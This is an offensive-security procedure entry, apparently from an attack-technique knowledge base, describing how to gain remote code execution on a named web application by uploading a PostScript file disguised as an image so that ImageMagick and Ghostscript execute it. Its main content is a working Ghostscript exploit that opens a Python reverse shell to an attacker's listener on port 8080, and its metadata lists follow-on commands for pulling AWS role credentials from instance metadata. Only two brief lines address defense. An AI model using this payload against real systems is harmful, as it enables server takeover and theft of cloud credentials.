---
tags:
  - rce
  - file-upload
type: procedure
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/Ghostscript]]'
  - '[[tools/Netcat]]'
  - '[[tools/curl]]'
  - '[[tools/Facebook-Messenger]]'
  - '[[tools/bash]]'
  - '[[tools/python]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/postscript-python-reverse-shell]]'
  - '[[commands/whoami]]'
  - '[[commands/ls]]'
  - '[[commands/cat-readme]]'
  - '[[commands/curl-aws-metadata-role]]'
  - '[[commands/curl-aws-credentials]]'
  - '[[commands/postscript-bash-reverse-shell]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[tools/python]]'
id: d1099c4b-c58c-44e6-a18d-fe4def39b1ea
created_at: '2025-12-11T06:10:32.791Z'
updated_at: '2025-12-11T06:10:32.791Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1190]]'
---
# Upload Malicious Postscript File

## Summary

This procedure involves uploading a malicious Postscript file disguised as an image to exploit vulnerabilities in file type validation and image processing in web applications like KitCRM.

## Description

The attack targets the image upload feature at https://kitcrm.com/seller/onboarding/1, where lack of validation allows Postscript files to be processed by ImageMagick and Ghostscript, leading to arbitrary code execution. The payload establishes a reverse shell to the attacker's listener.

## Requirements

1. Access to the target upload endpoint
2. Listener setup on port 8080 (e.g., using Netcat)
3. Ability to disguise the file as a valid image type

## Defense

Defensive measures and detection strategies:

- Implement strict file type validation and content checking
- Disable Ghostscript in ImageMagick configurations

## Objectives

1. Achieve initial code execution on the server
2. Establish reverse shell for further access
3. Validate vulnerability presence

## Instructions

### Step 1: Prepare and Upload Payload

**Context**: Create the malicious Postscript file and upload it as a priority product image.

**Command** ([[commands/postscript-python-reverse-shell]]):
```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("█████",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

> This payload pipes output to a Python script that connects back to the attacker's IP on port 8080, spawning an interactive shell.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[tools/python]]

## Commands Used

- [[commands/postscript-python-reverse-shell]]

## Tools Used

- [[tools/ImageMagick]]
- [[tools/Ghostscript]]

## Tags

- rce
- file-upload
